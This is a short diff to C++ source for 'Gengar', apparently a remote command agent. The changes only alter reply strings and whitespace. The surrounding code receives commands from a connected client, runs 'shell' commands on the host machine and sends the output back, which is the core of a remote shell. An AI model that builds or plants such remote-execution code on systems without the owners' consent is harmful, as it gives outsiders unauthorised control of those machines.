@@ -13,7 +13,7 @@ void Gengar::ListenForCommand()
 			size_t delimiter_index = input.find(type_content_delimiter);
 
 			if (delimiter_index == std::string::npos)
-				m_client.Send("Invalid command. Ignoring.\n");
+				m_client.Send("Invalid command.\n");
 			else
 			{
 				std::string type = input.substr(0, delimiter_index);
@@ -29,7 +29,6 @@ void Gengar::ListenForCommand()
 	}
 }
 
-
 void Gengar::RouteCommand(std::string& type, std::string& content)
 {
 	std::string output;
@@ -37,7 +36,7 @@ void Gengar::RouteCommand(std::string& type, std::string& content)
 	if (type == "shell")
 		output = m_machine.RunShellCommand(std::move(content));
 	else
-		output = "Unknown command type.";
+		output = "Unknown command type.\n";
 
 	m_client.Send(std::move(output));
 }
